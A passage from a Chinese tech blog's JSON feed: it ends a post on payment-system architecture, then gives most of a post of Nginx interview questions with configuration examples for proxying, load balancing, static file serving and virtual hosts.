alt=\"\"></p>\n<p>因此，可以拆分获取凭证的操作，通过独立网关渠道前置服务，将获取的方式异步化，从前置网关获取内部凭证，然后由前置网关去异步调用第三方。</p>\n<p>异步并行化<br><img src=\"/img/202304/20230605220759.png\" alt=\"\"></p>\n<p>资金核算异步化<br><img src=\"/img/202304/20230605220812.png\" alt=\"\"></p>\n<p>热点账户账务单独处理<br><img src=\"/img/202304/20230605220823.png\" alt=\"\"></p>\n<p>记账事务切分<br><img src=\"/img/202304/20230605220833.png\" alt=\"\"></p>\n<p>4.生产实践</p>\n<ul>\n<li>性能压测</li>\n</ul>\n<p>构建压测模型，模拟现实真实场景；压测数据进影子库，正常业务无侵入；单机性能和集权链路都不能忽视；识别系统稳定性和容量配比。。。<br><img src=\"/img/202304/20230605220847.png\" alt=\"\"></p>\n<ul>\n<li><p>稳定性治理<br><img src=\"/img/202304/20230605220858.png\" alt=\"\"></p>\n</li>\n<li><p>核心链路分离<br><img src=\"/img/202304/20230605220908.png\" alt=\"\"></p>\n</li>\n<li><p>服务依赖降级<br><img src=\"/img/202304/20230605220918.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg\">https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg</a></p>\n",
            "tags": [
                "支付系统",
                "支付"
            ]
        },
        {
            "id": "https://erik.xyz/2023/02/02/40-ge-nginx-questions/",
            "url": "https://erik.xyz/2023/02/02/40-ge-nginx-questions/",
            "title": "40个 Nginx 常问面试题",
            "date_published": "2023-02-02T05:59:00.000Z",
            "content_html": "<h2 id=\"什么是-Nginx？\"><a href=\"#什么是-Nginx？\" class=\"headerlink\" title=\"什么是 Nginx？\"></a>什么是 Nginx？</h2><hr>\n<p>Nginx 是一个 轻量级 / 高性能的反向代理 Web 服务器，用于 HTTP、HTTPS、SMTP、POP3 和 IMAP 协议。他实现非常高效的反向代理、负载平衡，他可以处理 2-3 万并发连接数，官方监测能支持 5 万并发，现在中国使用 nginx 网站用户有很多，例如：新浪、网易、 腾讯等。</p>\n<h5 id=\"Nginx-有哪些优点？\"><a href=\"#Nginx-有哪些优点？\" class=\"headerlink\" title=\"Nginx 有哪些优点？\"></a>Nginx 有哪些优点？</h5><ul>\n<li><p>跨平台、配置简单。</p>\n</li>\n<li><p>非阻塞、高并发连接：处理 2-3 万并发连接数，官方监测能支持 5 万并发。</p>\n</li>\n<li><p>内存消耗</p>\n<span id=\"more\"></span></li>\n<li><p>小：开启 10 个 Nginx 才占 150M 内存。</p>\n</li>\n<li><p>成本低廉，且开源。</p>\n</li>\n<li><p>稳定性高，宕机的概率非常小。</p>\n</li>\n<li><p>内置的健康检查功能：如果有一个服务器宕机，会做一个健康检查，再发送的请求就不会发送到宕机的服务器了。重新将请求提交到其他的节点上</p>\n</li>\n</ul>\n<h2 id=\"Nginx-应用场景？\"><a href=\"#Nginx-应用场景？\" class=\"headerlink\" title=\"Nginx 应用场景？\"></a>Nginx 应用场景？</h2><hr>\n<ul>\n<li><p>http 服务器。Nginx 是一个 http 服务可以独立提供 http 服务。可以做网页静态服务器。</p>\n</li>\n<li><p>虚拟主机。可以实现在一台服务器虚拟出多个网站，例如个人网站使用的虚拟机。</p>\n</li>\n<li><p>反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用 nginx 做反向代理。并且多台服务器可以平均分担负载，不会应为某台服务器负载高宕机而某台服务器闲置的情况。</p>\n</li>\n<li><p>nginz 中也可以配置安全管理、比如可以使用 Nginx 搭建 API 接口网关, 对每个接口服务进行拦截。</p>\n</li>\n</ul>\n<h2 id=\"Nginx-怎么处理请求的？\"><a href=\"#Nginx-怎么处理请求的？\" class=\"headerlink\" title=\"Nginx 怎么处理请求的？\"></a>Nginx 怎么处理请求的？</h2><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123; # 第一个Server区块开始，表示一个独立的虚拟主机站点</span><br><span class=\"line\">   listen       80；# 提供服务的端口，默认80</span><br><span class=\"line\">   server_name localhost; # 提供服务的域名主机名</span><br><span class=\"line\">   location / &#123; # 第一个location区块开始</span><br><span class=\"line\">     root   html; # 站点的根目录，相当于Nginx的安装目录</span><br><span class=\"line\">     index  index.html index.html; # 默认的首页文件，多个用空格分开</span><br><span class=\"line\">&#125; # 第一个location区块结果</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>首先，Nginx 在启动时，会解析配置文件，得到需要监听的端口与 IP 地址，然后在 Nginx 的 Master 进程里面先初始化好这个监控的 Socket(创建 S ocket，设置 addr、reuse 等选项，绑定到指定的 ip 地址端口，再 listen 监听)。</p>\n</li>\n<li><p>然后，再 fork(一个现有进程可以调用 fork 函数创建一个新进程。由 fork 创建的新进程被称为子进程) 出多个子进程出来。</p>\n</li>\n<li><p>之后，子进程会竞争 accept 新的连接。此时，客户端就可以向 nginx 发起连接了。当客户端与 nginx 进行三次握手，与 nginx 建立好一个连接后。此时，某一个子进程会 accept 成功，得到这个建立好的连接的 Socket ，然后创建 nginx 对连接的封装，即 ngx_connection_t 结构体。</p>\n</li>\n<li><p>接着，设置读写事件处理函数，并添加读写事件来与客户端进行数据的交换。</p>\n</li>\n<li><p>最后，Nginx 或客户端来主动关掉连接，到此，一个连接就寿终正寝了。</p>\n</li>\n</ul>\n<h2 id=\"Nginx-是如何实现高并发的？\"><a href=\"#Nginx-是如何实现高并发的？\" class=\"headerlink\" title=\"Nginx 是如何实现高并发的？\"></a>Nginx 是如何实现高并发的？</h2><hr>\n<pre><code>    如果一个 server 采用一个进程 (或者线程) 负责一个 request 的方式，那么进程数就是并发数。那么显而易见的，就是会有很多进程在等待中。等什么？最多的应该是等待网络传输。\n\n    而 Nginx 的异步非阻塞工作方式正是利用了这点等待的时间。在需要等待的时候，这些进程就空闲出来待命了。因此表现为少数几个进程就解决了大量的并发问题。\n\n    Nginx 是如何利用的呢，简单来说：同样的 4 个进程，如果采用一个进程负责一个 request 的方式，那么，同时进来 4 个 request 之后，每个进程就负责其中一个，直至会话关闭。期间，如果有第 5 个 request 进来了。就无法及时反应了，因为 4 个进程都没干完活呢，因此，一般有个调度进程，每当新进来了一个 request ，就新开个进程来处理。\n</code></pre><p>回想下，BIO 是不是存在酱紫的问题？</p>\n<pre><code>    Nginx 不这样，每进来一个 request ，会有一个 worker 进程去处理。但不是全程的处理，处理到什么程度呢？处理到可能发生阻塞的地方，比如向上游（后端）服务器转发 request ，并等待请求返回。那么，这个处理的 worker 不会这么傻等着，他会在发送完请求后，注册一个事件：“如果 upstream 返回了，告诉我一声，我再接着干”。于是他就休息去了。此时，如果再有 request 进来，他就可以很快再按这种方式处理。而一旦上游服务器返回了，就会触发这个事件，worker 才会来接手，这个 request 才会接着往下走。\n</code></pre><p>这就是为什么说，Nginx 基于事件模型。</p>\n<p>由于 web server 的工作性质决定了每个 request 的大部份生命都是在网络传输中，实际上花费在 server 机器上的时间片不多。这是几个进程就解决高并发的秘密所在。即：</p>\n<p>webserver 刚好属于网络 IO 密集型应用，不算是计算密集型。</p>\n<p>异步，非阻塞，使用 epoll ，和大量细节处的优化。也正是 Nginx 之所以然的技术基石。</p>\n<h2 id=\"什么是正向代理？\"><a href=\"#什么是正向代理？\" class=\"headerlink\" title=\"什么是正向代理？\"></a>什么是正向代理？</h2><hr>\n<pre><code>    一个位于客户端和原始服务器 (origin server) 之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。\n</code></pre><p>客户端才能使用正向代理。正向代理总结就一句话：代理端代理的是客户端。例如说：我们使用的 OpenVPN 等等。</p>\n<h3 id=\"什么是反向代理？\"><a href=\"#什么是反向代理？\" class=\"headerlink\" title=\"什么是反向代理？\"></a>什么是反向代理？</h3><hr>\n<p>反向代理（Reverse Proxy）方式，是指以代理服务器来接受 Internet 上的连接请求，然后将请求，发给内部网络上的服务器并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>\n<pre><code>    反向代理总结就一句话：代理端代理的是服务端。\n</code></pre><h4 id=\"反向代理服务器的优点是什么\"><a href=\"#反向代理服务器的优点是什么\" class=\"headerlink\" title=\"反向代理服务器的优点是什么?\"></a>反向代理服务器的优点是什么?</h4><hr>\n<pre><code>    反向代理服务器可以隐藏源服务器的存在和特征。它充当互联网云和 web 服务器之间的中间层。这对于安全方面来说是很好的，特别是当您使用 web 托管服务时。\n</code></pre><h2 id=\"Nginx-目录结构有哪些？\"><a href=\"#Nginx-目录结构有哪些？\" class=\"headerlink\" title=\"Nginx 目录结构有哪些？\"></a>Nginx 目录结构有哪些？</h2><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tree /usr/local/nginx</span><br><span class=\"line\">/usr/local/nginx</span><br><span class=\"line\">├── client_body_temp</span><br><span class=\"line\">├── conf # Nginx所有配置文件的目录</span><br><span class=\"line\">│ ├── fastcgi.conf # fastcgi相关参数的配置文件</span><br><span class=\"line\">│ ├── fastcgi.conf.default         # fastcgi.conf的原始备份文件</span><br><span class=\"line\">│ ├── fastcgi_params # fastcgi的参数文件</span><br><span class=\"line\">│ ├── fastcgi_params.default       </span><br><span class=\"line\">│ ├── koi-utf</span><br><span class=\"line\">│ ├── koi-win</span><br><span class=\"line\">│ ├── mime.types # 媒体类型</span><br><span class=\"line\">│ ├── mime.types.default</span><br><span class=\"line\">│ ├── nginx.conf # Nginx主配置文件</span><br><span class=\"line\">│ ├── nginx.conf.default</span><br><span class=\"line\">│ ├── scgi_params # scgi相关参数文件</span><br><span class=\"line\">│ ├── scgi_params.default  </span><br><span class=\"line\">│ ├── uwsgi_params # uwsgi相关参数文件</span><br><span class=\"line\">│ ├── uwsgi_params.default</span><br><span class=\"line\">│ └── win-utf</span><br><span class=\"line\">├── fastcgi_temp # fastcgi临时数据目录</span><br><span class=\"line\">├── html # Nginx默认站点目录</span><br><span class=\"line\">│ ├── 50x.html # 错误页面优雅替代显示文件，例如当出现502错误时会调用此页面</span><br><span class=\"line\">│ └── index.html # 默认的首页文件</span><br><span class=\"line\">├── logs # Nginx日志目录</span><br><span class=\"line\">│ ├── access.log # 访问日志文件</span><br><span class=\"line\">│ ├── error.log # 错误日志文件</span><br><span class=\"line\">│ └── nginx.pid # pid文件，Nginx进程启动后，会把所有进程的ID号写到此文件</span><br><span class=\"line\">├── proxy_temp # 临时目录</span><br><span class=\"line\">├── sbin # Nginx命令目录</span><br><span class=\"line\">│ └── nginx # Nginx的启动命令</span><br><span class=\"line\">├── scgi_temp # 临时目录</span><br><span class=\"line\">└── uwsgi_temp # 临时目录</span><br></pre></td></tr></table></figure>\n<h3 id=\"Nginx-配置文件-nginx-conf-有哪些属性模块\"><a href=\"#Nginx-配置文件-nginx-conf-有哪些属性模块\" class=\"headerlink\" title=\"Nginx 配置文件 nginx.conf 有哪些属性模块?\"></a>Nginx 配置文件 nginx.conf 有哪些属性模块?</h3><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">worker_processes  1；# worker进程的数量</span><br><span class=\"line\">events &#123; # 事件区块开始</span><br><span class=\"line\">    worker_connections  1024；# 每个worker进程支持的最大连接数</span><br><span class=\"line\">&#125; # 事件区块结束</span><br><span class=\"line\">http &#123; # HTTP区块开始</span><br><span class=\"line\">    include       mime.types；# Nginx支持的媒体类型库文件</span><br><span class=\"line\">    default_type application/octet-stream；# 默认的媒体类型</span><br><span class=\"line\">    sendfile on；# 开启高效传输模式</span><br><span class=\"line\">    keepalive_timeout 65；# 连接超时</span><br><span class=\"line\">    server &#123; # 第一个Server区块开始，表示一个独立的虚拟主机站点</span><br><span class=\"line\">        listen       80；# 提供服务的端口，默认80</span><br><span class=\"line\">        server_name localhost；# 提供服务的域名主机名</span><br><span class=\"line\">        location / &#123; # 第一个location区块开始</span><br><span class=\"line\">            root   html；# 站点的根目录，相当于Nginx的安装目录</span><br><span class=\"line\">            index index.html index.htm；# 默认的首页文件，多个用空格分开</span><br><span class=\"line\">        &#125; # 第一个location区块结果</span><br><span class=\"line\">        error_page 500502503504  /50x.html；# 出现对应的http状态码时，使用50x.html回应客户</span><br><span class=\"line\">        location = /50x.html &#123; # location区块开始，访问50x.html</span><br><span class=\"line\">            root   html；# 指定对应的站点目录为html</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ......</span><br></pre></td></tr></table></figure>\n<h3 id=\"cookie-和-session-区别？\"><a href=\"#cookie-和-session-区别？\" class=\"headerlink\" title=\"cookie 和 session 区别？\"></a>cookie 和 session 区别？</h3><hr>\n<h5 id=\"共同：\"><a href=\"#共同：\" class=\"headerlink\" title=\"共同：\"></a>共同：</h5><p>存放用户信息。存放的形式：key-value 格式 变量和变量内容键值对。</p>\n<h5 id=\"区别：\"><a href=\"#区别：\" class=\"headerlink\" title=\"区别：\"></a>区别：</h5><p>cookie</p>\n<ul>\n<li><p>存放在客户端浏览器</p>\n</li>\n<li><p>每个域名对应一个 cookie，不能跨跃域名访问其他 cookie</p>\n</li>\n<li><p>用户可以查看或修改 cookie</p>\n</li>\n<li><p>http 响应报文里面给你浏览器设置</p>\n</li>\n<li><p>钥匙（用于打开浏览器上锁头）</p>\n</li>\n</ul>\n<p>session:</p>\n<ul>\n<li><p>存放在服务器（文件，数据库，redis）</p>\n</li>\n<li><p>存放敏感信息</p>\n</li>\n<li><p>锁头</p>\n</li>\n</ul>\n<h4 id=\"为什么-Nginx-不使用多线程？\"><a href=\"#为什么-Nginx-不使用多线程？\" class=\"headerlink\" title=\"为什么 Nginx 不使用多线程？\"></a>为什么 Nginx 不使用多线程？</h4><hr>\n<pre><code>    Apache: 创建多个进程或线程，而每个进程或线程都会为其分配 cpu 和内存（线程要比进程小的多，所以 worker 支持比 perfork 高的并发），并发过大会榨干服务器资源。\n</code></pre><p>Nginx: 采用单线程来异步非阻塞处理请求（管理员可以配置 Nginx 主进程的工作进程的数量）(epoll)，不会为每个请求分配 cpu 和内存资源，节省了大量资源，同时也减少了大量的 CPU 的上下文切换。所以才使得 Nginx 支持更高的并发。</p>\n<h4 id=\"nginx-和-apache-的区别\"><a href=\"#nginx-和-apache-的区别\" class=\"headerlink\" title=\"nginx 和 apache 的区别\"></a>nginx 和 apache 的区别</h4><hr>\n<p>轻量级，同样起 web 服务，比 apache 占用更少的内存和资源。</p>\n<p>抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞性的，在高并发下 nginx 能保持低资源，低消耗高性能。</p>\n<p>高度模块化的设计，编写模块相对简单。</p>\n<p>最核心的区别在于 apache 是同步多进程模型，一个连接对应一个进程，nginx 是异步的，多个连接可以对应一个进程。<br><img src=\"/img/202301/20230221141046.png\" alt=\"erik.xyz\"></p>\n<h5 id=\"什么是动态资源、静态资源分离？\"><a href=\"#什么是动态资源、静态资源分离？\" class=\"headerlink\" title=\"什么是动态资源、静态资源分离？\"></a>什么是动态资源、静态资源分离？</h5><pre><code>    动态资源、静态资源分离，是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路。\n</code></pre><p>动态资源、静态资源分离简单的概括是：动态文件与静态文件的分离。</p>\n<h4 id=\"为什么要做动、静分离？\"><a href=\"#为什么要做动、静分离？\" class=\"headerlink\" title=\"为什么要做动、静分离？\"></a>为什么要做动、静分离？</h4><hr>\n<p>在我们的软件开发中，有些请求是需要后台处理的（如：.jsp,.do 等等），有些请求是不需要经过后台处理的（如：css、html、jpg、js 等等文件），这些不需要经过后台处理的文件称为静态文件，否则动态文件。</p>\n<pre><code>    因此我们后台处理忽略静态文件。这会有人又说那我后台忽略静态文件不就完了吗？当然这是可以的，但是这样后台的请求次数就明显增多了。在我们对资源的响应速度有要求的时候，我们应该使用这种动静分离的策略去解决动、静分离将网站静态资源（HTML，JavaScript，CSS，img 等文件）与后台应用分开部署，提高用户访问静态代码的速度，降低对后台应用访问\n</code></pre><p>这里我们将静态资源放到 Nginx 中，动态资源转发到 Tomcat 服务器中去。</p>\n<p>当然，因为现在七牛、阿里云等 CDN 服务已经很成熟，主流的做法，是把静态资源缓存到 CDN 服务中，从而提升访问速度。</p>\n<pre><code>    相比本地的 Nginx 来说，CDN 服务器由于在国内有更多的节点，可以实现用户的就近访问。并且，CDN 服务可以提供更大的带宽，不像我们自己的应用服务，提供的带宽是有限的。\n</code></pre><h5 id=\"什么叫-CDN-服务？\"><a href=\"#什么叫-CDN-服务？\" class=\"headerlink\" title=\"什么叫 CDN 服务？\"></a>什么叫 CDN 服务？</h5><hr>\n<p>CDN ，即内容分发网络。</p>\n<p>其目的是，通过在现有的 Internet 中 增加一层新的网络架构，将网站的内容发布到最接近用户的网络边缘，使用户可就近取得所需的内容，提高用户访问网站的速度。</p>\n<p>一般来说，因为现在 CDN 服务比较大众，所以基本所有公司都会使用 CDN 服务。</p>\n<h4 id=\"Nginx-怎么做的动静分离？\"><a href=\"#Nginx-怎么做的动静分离？\" class=\"headerlink\" title=\"Nginx 怎么做的动静分离？\"></a>Nginx 怎么做的动静分离？</h4><hr>\n<pre><code>    只需要指定路径对应的目录。location / 可以使用正则表达式匹配。并指定对应的硬盘中的目录。如下：（操作都是在 Linux 上）\n</code></pre>  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /image/ &#123;</span><br><span class=\"line\">    root /usr/local/static/;</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">步骤：</span><br><span class=\"line\"># 创建目录</span><br><span class=\"line\">mkdir /usr/local/static/image</span><br><span class=\"line\"> </span><br><span class=\"line\"># 进入目录</span><br><span class=\"line\">cd  /usr/local/static/image</span><br><span class=\"line\"> </span><br><span class=\"line\"># 上传照片</span><br><span class=\"line\">photo.jpg</span><br><span class=\"line\"> </span><br><span class=\"line\"># 重启nginx</span><br><span class=\"line\">sudo nginx -s reload</span><br></pre></td></tr></table></figure>\n<p>打开浏览器 输入 server_name/image/1.jpg 就可以访问该静态图片了</p>\n<h3 id=\"Nginx-负载均衡的算法怎么实现的-策略有哪些\"><a href=\"#Nginx-负载均衡的算法怎么实现的-策略有哪些\" class=\"headerlink\" title=\"Nginx 负载均衡的算法怎么实现的? 策略有哪些?\"></a>Nginx 负载均衡的算法怎么实现的? 策略有哪些?</h3><hr>\n<pre><code>    为了避免服务器崩溃，大家会通过负载均衡的方式来分担服务器压力。将对台服务器组成一个集群，当用户访问时，先访问到一个转发服务器，再由转发服务器将访问分发到压力更小的服务器。\n</code></pre><p>Nginx 负载均衡实现的策略有以下五种：</p>\n<p>1 . 轮询 (默认)<br>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端某个服务器宕机，能自动剔除故障系统。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream backserver &#123;</span><br><span class=\"line\"> server 192.168.0.12;</span><br><span class=\"line\"> server 192.168.0.13;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>权重 weight<br>weight 的值越大，分配到的访问概率越高，主要用于后端每台服务器性能不均衡的情况下。其次是为在主从的情况下设置不同的权值，达到合理有效的地利用主机资源。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 权重越高，在被访问的概率越大，如上例，分别是20%，80%。</span><br><span class=\"line\">upstream backserver &#123;</span><br><span class=\"line\"> server 192.168.0.12 weight=2;</span><br><span class=\"line\"> server 192.168.0.13 weight=8;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>ip_hash(IP 绑定)<br>每个请求按访问 IP 的哈希结果分配，使来自同一个 IP 的访客固定访问一台后端服务器，并且可以有效解决动态网页存在的 session 共享问题</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream backserver &#123;</span><br><span class=\"line\"> ip_hash;</span><br><span class=\"line\"> server 192.168.0.12:88;</span><br><span class=\"line\"> server 192.168.0.13:80;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>fair(第三方插件)<br>必须安装 upstream_fair 模块。</li>\n</ol>\n<p>对比 weight、ip_hash 更加智能的负载均衡算法，fair 算法可以根据页面大小和加载时间长短智能地进行负载均衡，响应时间短的优先分配。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 哪个服务器的响应速度快，就将请求分配到那个服务器上。</span><br><span class=\"line\">upstream backserver &#123;</span><br><span class=\"line\"> server server1;</span><br><span class=\"line\"> server server2;</span><br><span class=\"line\"> fair;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>5.url_hash(第三方插件)</p>\n<p>必须安装 Nginx 的 hash 软件包</p>\n<p>按访问 url 的 hash 结果来分配请求，使每个 url 定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream backserver &#123;</span><br><span class=\"line\"> server squid1:3128;</span><br><span class=\"line\"> server squid2:3128;</span><br><span class=\"line\"> hash $request_uri;</span><br><span class=\"line\"> hash_method crc32;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"如何用-Nginx-解决前端跨域问题？\"><a href=\"#如何用-Nginx-解决前端跨域问题？\" class=\"headerlink\" title=\"如何用 Nginx 解决前端跨域问题？\"></a>如何用 Nginx 解决前端跨域问题？</h4><hr>\n<p>使用 Nginx 转发请求。把跨域的接口写成调本域的接口，然后将这些接口转发到真正的请求地址。</p>\n<h4 id=\"Nginx-虚拟主机怎么配置\"><a href=\"#Nginx-虚拟主机怎么配置\" class=\"headerlink\" title=\"Nginx 虚拟主机怎么配置?\"></a>Nginx 虚拟主机怎么配置?</h4><hr>\n<p>1、基于域名的虚拟主机，通过域名来区分虚拟主机——应用：外部网站</p>\n<p>2、基于端口的虚拟主机，通过端口来区分虚拟主机——应用：公司内部网站，外部网站的管理后台</p>\n<p>3、基于 ip 的虚拟主机。</p>\n<h5 id=\"基于虚拟主机配置域名\"><a href=\"#基于虚拟主机配置域名\" class=\"headerlink\" title=\"基于虚拟主机配置域名\"></a>基于虚拟主机配置域名</h5><p>需要建立 / data/www /data/bbs 目录，windows 本地 hosts 添加虚拟机 ip 地址对应的域名解析；对应域名网站目录下新增 index.html 文件；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 当客户端访问www.lijie.com,监听端口号为80,直接跳转到data/www目录下文件</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       80;</span><br><span class=\"line\">    server_name  www.lijie.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        root   data/www;</span><br><span class=\"line\">        index  index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 当客户端访问www.lijie.com,监听端口号为80,直接跳转到data/bbs目录下文件</span><br><span class=\"line\"> server &#123;</span><br><span class=\"line\">    listen       80;</span><br><span class=\"line\">    server_name  bbs.lijie.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        root   data/bbs;</span><br><span class=\"line\">        index  index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"基于端口的虚拟主机\"><a href=\"#基于端口的虚拟主机\" class=\"headerlink\" title=\"基于端口的虚拟主机\"></a>基于端口的虚拟主机</h5><p>使用端口来区分，浏览器使用域名或 ip 地址: 端口号 访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 当客户端访问www.lijie.com,监听端口号为8080,直接跳转到data/www目录下文件</span><br><span class=\"line\"> server &#123;</span><br><span class=\"line\">    listen       8080;</span><br><span class=\"line\">    server_name  8080.lijie.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        root   data/www;</span><br><span class=\"line\">        index  index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 当客户端访问www.lijie.com,监听端口号为80直接跳转到真实ip服务器地址 127.0.0.1:8080</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       80;</span><br><span class=\"line\">    server_name  www.lijie.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">         proxy_pass http://127.0.0.1:8080;</span><br><span class=\"line\">        index  index.html index.htm;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"location-的作用是什么？\"><a href=\"#location-的作用是什么？\" class=\"headerlink\" title=\"location 的作用是什么？\"></a>location 的作用是什么？</h4><hr>\n<p>location 指令的作用是根据用户请求的 URI 来执行不同的应用，也就是根据用户请求的网站 URL 进行匹配，匹配成功即进行相关的操作。</p>\n<p>location 的语法能说出来吗？</p>\n<pre><code>    注意：~ 代表自己输入的英文字母\n</code></pre><p>  <img 